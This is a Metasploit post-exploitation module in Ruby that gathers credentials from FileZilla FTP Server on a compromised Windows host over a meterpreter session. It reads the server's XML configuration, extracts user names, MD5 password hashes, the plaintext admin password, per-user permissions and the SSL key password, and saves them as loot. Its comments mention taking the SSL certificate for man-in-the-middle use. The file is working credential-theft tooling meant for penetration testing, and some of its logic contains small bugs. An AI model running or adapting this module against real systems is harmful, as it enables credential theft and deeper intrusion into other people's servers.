##
# $Id: filezilla_server.rb 13512 2011-08-10 17:48:30Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'rexml/document'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Windows Gather FileZilla FTP Server Credential Collection',
			'Description'    => %q{ This module will collect credentials from the FileZilla FTP server if installed. },
			'License'        => MSF_LICENSE,
			'Author'         => ['bannedit'],
			'Version'        => '$Revision: 13512 $',
			'Platform'       => ['windows'],
			'SessionTypes'   => ['meterpreter' ]
		))
		register_options(
			[
				OptBool.new('SSLCERT', [false, 'Loot the SSL Certificate if its there?', false]), # useful perhaps for MITM
			], self.class)
	end

	def run
		if session.type != "meterpreter"
			print_error "Only meterpreter sessions are supported by this post module"
			return
		end

		drive = session.fs.file.expand_path("%SystemDrive%")
		case session.platform
		when /win64/i
			@progs = drive + '\\Program Files (x86)\\'
		when /win32/i
			@progs = drive + '\\Program Files\\'
		end

		filezilla = check_filezilla
		if filezilla != nil
			get_filezilla_creds(filezilla)
		end
	end

	def check_filezilla
		paths = []
		path = @progs + "FileZilla Server\\"

		print_status("Checking for Filezilla Server directory in: #{path}")

		begin
			session.fs.dir.entries(path)
		rescue ::Exception => e
			print_error(e.to_s)
			return
		end

		session.fs.dir.foreach(path) do |fdir|
			if fdir =~ /FileZilla\sServer.*\.xml/i
				paths << path + fdir
			end
		end

		if !paths.empty?
			print_status("Found FileZilla Server")
			print_line("")
			paths << path + 'FileZilla Server.xml'
			paths << path + 'FileZilla Server Interface.xml'

			return paths
		end

		return nil
	end

	def get_filezilla_creds(paths)
		fs_xml = ""
		fsi_xml = ""
		credentials = Rex::Ui::Text::Table.new(
		'Header'    => "FileZilla FTP Server Credentials",
		'Indent'    => 1,
		'Columns'   =>
		[
			"Host",
			"Port",
			"User",
			"Password",
			"SSL"
		])

		permissions = Rex::Ui::Text::Table.new(
		'Header'    => "FileZilla FTP Server Permissions",
		'Indent'    => 1,
		'Columns'   =>
		[
			"Host",
			"User",
			"Dir",
			"FileRead",
			"FileDelete",
			"FileAppend",
			"DirCreate",
			"DirDelete",
			"DirList",
			"DirSubdirs",
			"Home",
			"AutoCreate"
		])

		configuration = Rex::Ui::Text::Table.new(
		'Header'    => "FileZilla FTP Server Configuration",
		'Indent'    => 1,
		'Columns'   =>
		[
			"FTP Port",
			"FTP Bind IP",
			"Admin Port",
			"Admin Bind IP",
			"Admin Password",
			"SSL",
			"SSL Certfile",
			"SSL Key Password"
		])

		file = session.fs.file.new(paths[1], "rb")
		until file.eof?
			fs_xml << file.read
		end
		file.close

		creds, perms, config = parse_server(fs_xml) # user credentials password is just an MD5 hash
		 										    # admin pass is just plain text. Priorities?
		creds.each do |cred|
			credentials << [cred['host'], cred['port'], cred['user'], cred['password'], cred['ssl']]

			# report the goods!
			report_auth_info(
				:host  => session,
				:port => config['ftp_port'],
				:sname => 'ftp',
				:proto => 'tcp',
				:user => cred['user'],
				:pass => cred['password'],
				:ptype => "MD5 hash",
				:target_host => config['ftp_bindip'],
				:target_port => config['ftp_port']
			)
		end

		perms.each do |perm|
		permissions << [perm['host'], perm['user'], perm['dir'], perm['fileread'], perm['filewrite'], perm['filedelete'], perm['fileappend'],
			perm['dircreate'], perm['dirdelete'], perm['dirlist'], perm['dirsubdirs'], perm['autocreate']]
		end

		if datastore['VERBOSE']
			print_status("    Collected the following configuration details:")
			print_status("       FTP Port: %s" % config['ftp_port'])
			print_status("    FTP Bind IP: %s" % config['ftp_bindip'])
			print_status("            SSL: %s" % config['ssl'])
			print_status("     Admin Port: %s" % config['admin_port'])
			print_status("  Admin Bind IP: %s" % config['admin_bindip'])
			print_status("     Admin Pass: %s" % config['admin_pass'])
			print_line("")
		end

		configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'], config['admin_pass'],
			config['ssl'], config['ssl_certfile'], config['ssl_keypass']]

			# report the goods!
			report_auth_info(
				:host  => session,
				:port => config['admin_port'],
				:sname => 'filezilla-server-admin-interface',
				:proto => 'tcp',
				:user => 'admin',
				:pass => config['admin_pass'],
				:ptype => "password",
				:target_host => config['admin_bindip'],
				:target_port => config['admin_port']
			)

		store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
			"filezilla_server_credentials.txt", "FileZilla FTP Server Credentials")

		store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
			"filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")

		store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
			"filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
	end

	def parse_server(data)
		creds  = []
		perms  = []
		settings = {}
		users = 0
		passwords = 0
		groups = []
		perm = {}

		doc = REXML::Document.new(data).root

		items = doc.elements.to_a("//Settings//Item/")
		settings['ftp_port'] = items[0].text rescue "<none>"
		settings['admin_port'] = items[16].text rescue "<none>"
		settings['admin_pass'] = items[17].text rescue "<none>"
		settings['local_host'] = items[18].text rescue ""
		settings['bindip'] = items[38].text rescue ""
		settings['ssl'] = items[42].text rescue ""

		if settings['local_host'] # empty means localhost only * is 0.0.0.0
			settings['admin_bindip'] = settings['local_host']
		else
			settings['admin_bindip'] = "127.0.0.1"
		end
		if settings['admin_bindip'] = "*"
			settings['admin_bindip'] = "0.0.0.0"
		end
		
		if settings['bindip']
			settings['ftp_bindip'] = settings['bindip']
		else
			settings['ftp_bindip'] = "127.0.0.1"
		end

		# make the bindip a little easier to understand
		if settings['ftp_bindip'] == "*"
			settings['ftp_bindip'] = "0.0.0.0"
		end

		if settings['ssl'] == "1"
			settings['ssl'] = "true"
		else
			if datastore['SSLCERT']
				print_error("Cannot loot the SSL Certificate, SSL is disabled in the configuration file")
			end
			settings['ssl'] = "false"
		end

		settings['ssl_certfile'] = items[45].text rescue "<none>"
		if settings['ssl_certfile'] != "<none>" and settings['ssl'] == "true" and datastore['SSLCERT'] # lets get the file if its there could be useful in MITM attacks
			sslfile = session.fs.file.new(settings['ssl_certfile'])
			until sslfile.eof?
				sslcert << sslfile.read
			end
			store_loot("filezilla.server.ssl.cert", "text/plain", session, sslfile,
				settings['ssl_cert'] + ".txt", "FileZilla Server SSL Certificate File" )
			print_status("Looted SSL Certificate File")
		end
		
		if settings['ssl_certfile'].nil?
			settings['ssl_certfile'] = "<none>"
		end

		settings['ssl_keypass'] = items[50].text rescue "<none>"

		if settings['ssl_keypass'].nil?
			settings['ssl_keypass'] = "<none>"
		end

		doc.elements['Users'].elements.each('User') do |user|
			account = {}
			account['user'] = user.attributes['Name'] rescue "<none>"
			users += 1
			opt = user.elements.to_a("//User//Option/")
			account['password'] = opt[0].text rescue "<none>"
			account['group'] = opt[1].text rescue "<none>"
			passwords += 1
			groups << account['group']

			user.elements.to_a("//User//Permissions//Permission").each do |permission|
				perm['user'] = account['user'] # give some context as to which user has these permissions
				perm['dir'] = permission.attributes['Dir']
				opt = permission.elements.to_a("//User//Permissions//Permission//Option")
				perm['fileread']   = opt[0].text rescue "<unknown>"
				perm['filewrite']  = opt[1].text rescue "<unknown>"
				perm['filedelete'] = opt[2].text rescue "<unknown>"
				perm['fileappend'] = opt[3].text rescue "<unknown>"
				perm['dircreate']  = opt[4].text rescue "<unknown>"
				perm['dirdelete']  = opt[5].text rescue "<unknown>"
				perm['dirlist']    = opt[6].text rescue "<unknown>"
				perm['dirsubdirs'] = opt[7].text rescue "<unknown>"
				perm['autocreate'] = opt[9].text rescue "<unknown>"

				if opt[8].text == "1"
					perm['home'] = "true"
				else
					perm['home'] = "false"
				end
				perms << perm

			end

			user.elements.to_a("//User//IpFilter//Allowed").each do |allowed|
			end
			user.elements.to_a("//User//IpFilter//Disallowed").each do |disallowed|
			end

			account['host'] = settings['ftp_bindip']
			perm['host']    = settings['ftp_bindip']
			account['port'] = settings['ftp_port']
			account['ssl']  = settings['ssl']
			creds << account

			if datastore['VERBOSE']
				print_status("    Collected the following credentials:")
				print_status("    Username: %s" % account['user'])
				print_status("    Password: %s" % account['password'])
				print_status("       Group: %s" % account['group'])
				print_line("")
			end
		end

		groups = groups.uniq unless groups.uniq.nil?
		if !datastore['VERBOSE']
			print_status("    Collected the following credentials:")
			print_status("    Usernames: %u" % users)
			print_status("    Passwords: %u" % passwords)
			print_status("       Groups: %u" % groups.length)
			print_line("")
		end
		return [creds, perms, settings]
	end

	def got_root?
		if session.sys.config.getuid =~ /SYSTEM/
			return true
		end
		return false
	end

	def whoami
		return session.fs.file.expand_path("%USERNAME%")
	end
end
